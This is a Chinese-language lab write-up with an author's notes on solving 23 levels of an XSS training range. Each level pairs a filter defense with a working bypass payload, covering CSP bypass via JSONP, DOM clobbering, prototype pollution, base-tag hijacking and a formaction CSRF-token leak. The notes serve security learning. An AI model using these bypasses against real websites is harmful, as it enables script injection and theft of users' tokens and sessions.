---
title: "XSS学习靶场1"
lastmod: 2026-06-21T23:51:48+08:00
draft: false
---
github仓库：ArtSecTest/artsec-xss-labs
# 1
**Defenses:** None — your input is reflected directly into HTML with zero filtering.
所以应该是可以直接注入
直接输入就能绕过
```
<script>alert(1);</script>
```
# 2
**Defenses:** None — input is stored and rendered without any sanitization.
还是直接注入就可以了
```
<script>alert(1);</script>
```
# 3
**Defenses:** `&lt;script>` tags are stripped (case-insensitive regex).
这个标签被禁用了，我们还能用img标签
```
<img src=1 onerror=alert(1);>
```
# 4
**Defenses:** Input is placed inside an HTML attribute value (double-quoted). No tag filtering.
Your input is reflected into an input element's value attribute.
他给了提示是会包含进入一个<>里面，尝试提前闭合
他给了我们html的源代码：
```
<input type="text" value="1" style="width:100%;padding:0.5rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
```
所以可以提前闭合然后进行绕过
```
"><img src=1 onerror=alert(1);>
```
后面是什么你不用管
做出来了，但是题解里写还可以add new attribute（like event handlers）
尝试一下
```
" autofocus onfocus=alert(1) x="
```
这种方法也可以
在这里onfocus的意思是只要聚焦到了这个框后，就能直接弹出一个alert
然后autofocus的作用是页面打开的时候聚焦到这个框
# 5
**Defenses:** Angle brackets `< >` are HTML-encoded. Your input lands inside a JS string literal.
Your input is placed inside a JavaScript string variable. Angle brackets are encoded.
既然告诉你了他这个已经被写在js的框里面，还被"包裹了
那么我们可以尝试一下"绕过
查看一下源代码
```
|<script>|
|var userData = 'alert(1)';|
|document.querySelector('.output').innerHTML += '<p>User data: ' + userData + '</p>';|
|</script>|
```
好像通过'绕过就行
```
|<script>|
|var userData = ''alert(1)'';|
|document.querySelector('.output').innerHTML += '<p>User data: ' + userData + '</p>';|
|</script>|
```
但是发生了一点问题，没有成功注入
alert(1)必须单独作为一个语句才能注入，不能直接注入
突然发现好像后面不用闭合，直接//绕过就行
```
';alert(1);var ad='1
';alert(1);//
```
# 6
**Defenses:** `&lt;script>` tags stripped. Common event handlers (`onerror, onload, onclick, onmouseover, onfocus, onblur, oninput, onchange, onsubmit, onkeydown, onkeyup, onkeypress`) are stripped.
找一个姿势绕过就行
```
<details ontoggle=alert(1);>
```
题解里面告诉我们如果把所有的on都禁用掉的话就是直接禁用掉了所有的事情处理器属性这一xss
只能使用
```
<script>
javascript:
```
# 7
**Defenses:** Keywords stripped (single pass, case-insensitive): `script, alert, onerror, onload, onclick, onfocus, onmouseover, javascript, eval, prompt, confirm`.
过滤了一堆的关键词，但是好像没有我们的img
尝试了一下，不太行，不知道为什么出不出来结果
不对，alert没有了
可以双写绕过，比如alealertrt(1);
随便找一个就行
# 8
**Defenses:** No server-side reflection. Vulnerability is in client-side JavaScript that reads from `location.hash`.
This page has no server-side reflection. The vulnerability is entirely in the client-side JavaScript. Check the source!
Use the URL hash (#) to inject content.
```
|<script>|
|// Vulnerable client-side code|
|function renderHash() {|
|var hash = decodeURIComponent(location.hash.substring(1));|
|if (hash) {|
|document.getElementById('domOutput').innerHTML = '<p>Welcome, ' + hash + '!</p>';|
|}|
|}|
|window.addEventListener('hashchange', renderHash);|
|renderHash();|
|</script>|
```
输入方法是#
我猜测一下，先`</p>`闭合前面的，然后`<p>`打开一个新的，最后在中间写入代码
```
#</p><script>alert(1)</script><p>
```
但是好像不行
不对，是不是闭合；
```
'1';alart(1);//
```
不会了，看一下题解
```
#<img src=x onerror=alert("XSS")>
```
innerhtml会把字符串当作html解析，所以真的会解析成一张图片
innerhtml会把script直接当成字符串执行，所以我们其实是不能通过alert解析的
# 9
**Defenses:** `&lt;script>` stripped, event handlers stripped, `javascript:` protocol blocked (case-insensitive check).
他写了`&lt;script>`被禁用了，事件处理程序也被禁用了，javascript协议被阻塞了。
出现了一个新的协议：`javascript`
使用场景是类似`<a href="https://example.com">打开网站</a>`
这个里面href被认为是需要解析后面的协议，如果是http协议就打开网站
但是如果是javascript协议就是直接执行javascript程序
这个在当浏览器把他当成url解析的时候会被触发
```
<a href="javascript:alert(1)">
location.href = "javascript:alert(1)"
window.open("javascript:alert(1)")
```
正常情况下在这里会被解析
下一个关键点是HTML编码进行解析，这里面因为是输入进html文档内来解析，所以应该使用html编码进行解析，如果是在url场景里面进行编码，就会被解析成url编码
最终payload：
```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
```
# 10
**Defenses:** Content-Security-Policy: `script-src 'nonce-o74cxpy4ma' 'self'`. Only nonced scripts and same-origin scripts are allowed.
这一道题目有一个新概念，csp，内容安全策略
功能是一种防止xss的安全策列
一般会在响应头里面可以找到![[Pasted image 20260619125035.png]]
在这里可以看见有东西实现了这个东西
应该是防止住了xss
这个script-src控制了javascript的来源只能是他的本体和CDN的js
self表示允许当前网站自己的资源
题目给了一个提示
A strict Content-Security-Policy is in place. Inline scripts without the nonce will be blocked by the browser.
Interesting: there's an API endpoint at `/api/jsonp?callback=myFunction` on this same origin...
访问一下这个尝试一下
显示
```
123({"status":"ok"})
```
说明我们的状态其实是可以控制的
联想到上文我们说过，self让网站不会过滤自己的代码
那么我们尝试一下直接访问这个网站，然后通过javascript执行代码
至于后面的`({"status":"ok"})`可以直接通过注释注释掉
下一个问题是怎么通过url访问自己
使用src属性，这个能直接调用属性并且执行返回值
```
<script src="/api/jsonp?callback=alert(1)//"></script>
```
通过这个直接访问同域名下的这个，注意使用script标签包裹
# 11
**Defenses:** A WAF decodes your input once and checks for dangerous patterns (`&lt;script>`, event handlers, `javascript:`). If the WAF passes it, the application decodes **again** before rendering.
不是，应用和WAF双重验证吗
因为这个是双重验证，而两重验证都解析了一遍url编码
所以你可以通过两层url编码绕过
注意一下，你浏览器直接输入的话不需要两重url，浏览器会帮助你自己url一下
然后后面的application绕过就简单了，直接照片就行了
# 12
All HTML tags are stripped server-side. But the page uses a naive client(客户)-side template(模板) engine that evaluates `&#123;&#123;expressions&#125;&#125;`.
所有的html标签都被禁用了，但是他说用了一个模板能解析&#123;&#123;expressions&#125;&#125;
尝试一下`<scrip&#123;&#123;t>alert(1)</scr&#125;&#125;ipt>`
发现不行，难受
换成img尝试一下
还是不行
```
html = html.replace(/\{\{(.+?)\}\}/g, function(match, expr) {
  try { return eval(expr); } catch(e) { return match; }
});
```
客户端代码会把所有的包含的函<>和他们之间的东西都删掉
所以标签肯定不行
但是这道题目过滤的是标签，而不是表达式
eval会把里面的东西单程js语言执行
但是直接alert(1)不行
`constructor`是拿到这个程序的创建者
而`constructor.constructor`是拿到创建者的创建者，就是Function，也就是javascript中动态创建函数的内置函数
相当于先创建一个函数alert(1)，然后调用这个函数
`constructor.constructor('alert(1)')()` 里有两种不同语法：

- `a.b`：取 `a` 的 `b` 属性
- `f(...)`：调用函数

所以它实际是：

```
( constructor.constructor )('alert(1)')()
```
所以可以`&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;`来进行绕过
# 13
**Defenses:** No server-side reflection at all. The page listens for `window.postMessage()` events and renders content without origin validation.
This page listens for cross-window messages. There's no form here — find the vulnerable message handler in the source.
Tip: Open DevTools Console (F12) to interact with the page.
```
|window.addEventListener('message', function(e) {|
|// INSECURE: No origin validation, direct innerHTML|
|document.getElementById('messageOutput').innerHTML = '<p>Received: ' + e.data + '</p>';|
|});|
```
漏洞点在这里
这个e是可以控制的输入
在控制台执行
```
window.postMessage('<img src=x onerror=alert(1)>', '*')
```
然后直接并入程序里面
最终插入dom然后渲染出来
`window.postMessage(...)`是js的内置函数，作用是发送一条消息
然后子服务端设置了window.addEventListener('message', function(e) ，就会接收到这条消息
所以我们能接收到消息然后注入
## `postMessage`
写法：
```
window.postMessage(message, targetOrigin)
```
第一个参数 `message`
- 要发送的消息内容
- 可以是字符串、对象等
- 这题里发的是字符串：
```
'<img src=x onerror=alert(1)>'
```
第二个参数 `targetOrigin`
- 你希望“发给哪个来源的页面”
- 是一个安全限制
- 常见写法：
```
'*'
```
表示“不限制来源，谁都可以收”
或者写成：
```
'http://localhost:3000'
```
## addEnentListener
```
window.addEventListener('message', function(e) { ... })
```
意思是：
- 给 `window` 注册一个监听器
- 监听名字叫 **`message`** 的事件
- 当这种事件发生时，执行后面的函数
然后innerHTML的注入就行了
# 14
**Defenses:** File upload accepts SVG content. `&lt;script>` tags are stripped from uploads, but SVGs are rendered inline.
考的是一个svg标签，禁用了直接script的upload，但是直接用svg可以绕过
感觉和其他的方法没有区别，都是直接放在姿势总结里面一个个尝试的
# 15
**Defenses:** A client-side sanitizer uses DOMParser + `querySelectorAll` to strip scripts and event handlers, then re-inserts via innerHTML. After insertion, the page instantiates any `<template>` elements to support dynamic content.
```javascript
root.querySelectorAll('script').forEach(function(s) { s.remove(); });

root.querySelectorAll('*').forEach(function(el) {
  Array.from(el.attributes).forEach(function(attr) {
    if (attr.name.startsWith('on')) el.removeAttribute(attr.name);
  });
});
```
代码前面过滤的时候会忽略template标签
后面程序又把template标签加到了页面里面
```javascript
output.querySelectorAll('template').forEach(function(tmpl) {
  var clone = document.importNode(tmpl.content, true);
  tmpl.parentNode.insertBefore(clone, tmpl);
  tmpl.remove();
});
```
注意代码里的`querySelectorAll`并不会进入`<template>`筛选
所以直接找一个照片就行
```
<template><img src=x onerror=alert(1)></template>
```
# 16
**Defenses:** The filter runs in a **loop** until no more changes occur. Strips: `&lt;script>`, event handlers (`on*=`), `javascript:`, `alert`, `eval`, `prompt`, `confirm`, `Function`. Nesting tricks won't work here.
```javascript
do {
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  q = q.replace(/\bon\w+\s*=/gi, '');
  q = q.replace(/javascript\s*:/gi, '');
  q = q.replace(/alert/gi, '');
  q = q.replace(/eval/gi, '');
  q = q.replace(/prompt/gi, '');
  q = q.replace(/confirm/gi, '');
  q = q.replace(/Function/g, '');
} while (q !== prev);
```
应该是所有的标签都过滤全了
但是没有过滤iframe标签
`<iframe srcdoc="&lt;img src=x onerror=&#x27;top[`al`+`ert`](1)&#x27;&gt;"></iframe>`
这个里面iframe调用了一个新的文档，然后srcdoc直接去除了这个文档
alert需要进行拼接，通过`top[al+ert](1)`拼接成`alert(1)`
但是onerror并不需要拼接，因为它发生在字符串里面，所以不会被过滤
`<iframe srcdoc="&lt;img src=x onerror=&#x27;top[`al`+`ert`](1)&#x27;&gt;"></iframe>`
不知道为什么不可以了，换一个
`<iframe srcdoc="&lt;script&gt;top[`al`+`ert`](1)&lt;/script&gt;"></iframe>`
这个可以，用这个，原理是一样的
# 17
**Defenses:** `&lt;script>` tags stripped. Double quotes are HTML-encoded. Your input appears in **three different contexts simultaneously**: HTML body, an HTML attribute, and a JavaScript string.
你的注入会同时进入三个地方
```javascript
<p>HTML context: ${q}</p>
<input type="hidden" name="data" value="${q}">
<script>
  var tracking = '${q.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}';
</script>
```
但是这个三个地方完全是唬你的， 没用
按照官方题解，你的结果会是`';alert(1)//`
这个里面通过'先闭合字符串，然后绕过，最后通过注释忽略后面的输出
标准解法就是`';alert(1)//`，但是我的靶场坏掉了，出不来
# 18
**Defenses:** `&lt;script>` tags stripped, event handlers stripped, `javascript:` stripped. The page uses named DOM elements to configure behavior.
The page reads `window.config.href` to create a navigation link. Your HTML injection could overwrite `window.config`...
CONCEPT: DOM Clobbering
In browsers, HTML elements with an `id` or `name` attribute automatically become properties of the `window` object. For example, `<div id="foo">` makes `window.foo` reference that element. This is called **DOM clobbering** — injected HTML can overwrite global JavaScript variables without any script execution. If application code reads properties from `window.someVar` (e.g., `window.config`, `window.settings`), an attacker can inject HTML elements with matching IDs to hijack those values. Nested clobbering (using `<form>` + child elements, or `<a>` for `.href`) allows overwriting dot-notation paths like `config.href`. The `<a>` element's `.href` property is special — the browser resolves HTML entities and returns the full URL, making it a powerful clobber target.
这个就是源代码
```js
if (typeof window.config !== 'undefined' && window.config && window.config.href) {
  widget.innerHTML = '<div ...><a href="' + window.config.href + '" ...>Click here to continue</a></div>';
}
```
这个说明了网页新人了window.config.href
如果页面内有`<a id="config"...></a>`
那么浏览器会让window.config指向这个标签
所以可以用`<a id="config" href="javascript:alert(1)">clink</a>`
href是可跳转链接，在里面加入javascript把跳转的动作转换成执行的动作
# 19
**Defenses:** No direct HTML injection — input is treated as JSON and merged into a config object. A client-side rendering function checks `config.html` to render custom content.
这道题目是注入一段json代码，然后进行原型链污染，将你的数据拼接到html中间
关键代码有两段
```js
function merge(target, source) {
  // 遍历 source 的所有可枚举属性
  for (var key in source) {
    // 如果当前属性值是一个普通对象，就继续递归合并
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      // 目标对象上没有这个键时，先补一个空对象
      if (!target[key]) target[key] = {};
      // 递归把子对象继续合并进去
      merge(target[key], source[key]);
    } else {
      // 基本类型或数组直接覆盖到目标对象
      target[key] = source[key];
    }
  }
}
```
这个是不安全的合并，这个里面没有拦截`__proto__`，所以直接上传就可以了
这个里面的深度copy会把不安全的对象也复制进去
第二段的渲染点
```js
if (config.html) {
  out.innerHTML += config.html;
}
```
只要能让`config.html`取到你的恶意的代码，就能注入
payload:
```json
{"__proto__":{"html":"<img src=x onerror=alert(1)>"&#125;&#125;
```
`__proto__`指向的是这个对象的原型
对于一个对象，如果在他执行的时候查询函数，如果没有查询到，就会到他的原型里面去查询
对应的原型定义方法：
```js
var a = {};
console.log(a.__proto__ === Object.prototype); // true
```
这个时候a的原型就被定义到`Object.prototype`
所以可以直接跳转到原型里找到相应的值
对应到这道题目里面，题目里面有这句：
```js
var config = { title: 'Widget' };
```
而config的原型一般是`Object.prototype`
这个里面会把`target`的原型链也覆盖进去
这两个的原型是同一个，所以能污染。
# 20
**Defenses:** CSP: `script-src 'nonce-...' 'self'`. `&lt;script>` tags stripped, event handlers stripped, `javascript:` stripped. But your input is injected **before** the page's script tags.
这道题目的关键点在base这个标签
查看源代码
```js'
<div class="output"></div>
<!-- TODO: remove /evil/ debug path before going to production!! -->|
<script src="[level20-app.js](http://192.168.70.145:3000/level/level20-app.js)"></script>
```
这个里面会在output这个类型后面加上你输入的值
程序运行的时候会从`&lt;script src="[level20-app.js](http://192.168.70.145:3000/level/level20-app.js)">&lt;/script&gt;`里加载程序
实际的语句中可以忽略url，所以就是`&lt;script src="[level20-app.js]">&lt;/script&gt;`
`<base>`的作用是把给你程序自动读取的相对基址上面加上一串东西
在这道题目里直接输入
```js
<base href="/evil/">
```
他就会从/evil/这个地址先加到本地的基址上面去，然后再根据程序给定的地址去找
这样就造成了找到的程序不同
这道题目很贴心的给了这个程序，所以你可以直接找到这个地址，用payload绕过/
# 21
**Defenses:** `&lt;script>`, event handlers, `javascript:`, `<iframe>`, `<object>`, `<embed>`, `<base>` all stripped. A CSRF token is hidden in the page source.
```js
<form action="/level/21" method="GET" id="profileForm">
  <p>Bio: 你的输入</p>
  <input type="hidden" name="csrf_token" value="SUPER_SECRET_TOKEN_abc123xyz">
  <button type="submit">Update Profile</button>
</form>
```
我的输入在form里面
`<input type="hidden" name="csrf_token" value="SUPER_SECRET_TOKEN_abc123xyz">`
这个会把所有带有name字段的一起发出去
如果有下面这个表单：
```js
<form action="/abc" method="GET">
  <input name="x" value="1">
  <input name="y" value="2">
  <button type="submit">go</button>
</form>
```
那么他就会请求`/abc?x=1&y=2h'z`
这道题目里面他的上传形式会是/level/21?csrf_token=SUPER_SECRET_TOKEN_abc123xyz
因为你可以自定义输入，所以你就可以自己添加一个新的按钮
html里面有一个属性：```
```js
formaction="/api/leak"
```
通过这个属性可以控制提交的表单的地址
所以如果你注入
```js
<button formaction="/api/leak">steal</button>
```
那么最终的代码就是如果你点这个按钮，那么他的信息会上传到这个地址上面，就完成了token泄露
这个因为是服务器放的token，所以BP抓不到
# 22
**Defenses:** Input is embedded inside a JSON object in a `&lt;script>` block. Angle brackets are Unicode-escaped (`\u003c`). CSP blocks inline scripts without the nonce.
把程序注入到json里面`var appConfig = {"name": "${escaped}", "role": "user", "theme": "dark"};`
过滤了`<>`两个字符，但是这个是注入到字典里面
所以你可以直接通过`"`直接闭合这个字典然后通过//注销掉后面的所用东西
```js
"};alert(1);//
```
# 23
**Defenses:** `&lt;script>` stripped, event handlers stripped, `javascript:` blocked (case-insensitive). Input is placed into an `<a href>`.
这道题目是直接把你的输入塞进href
但是javascript被过滤了
那么你加一个html编码就行了
```
&#106;avascript:alert(1)
```
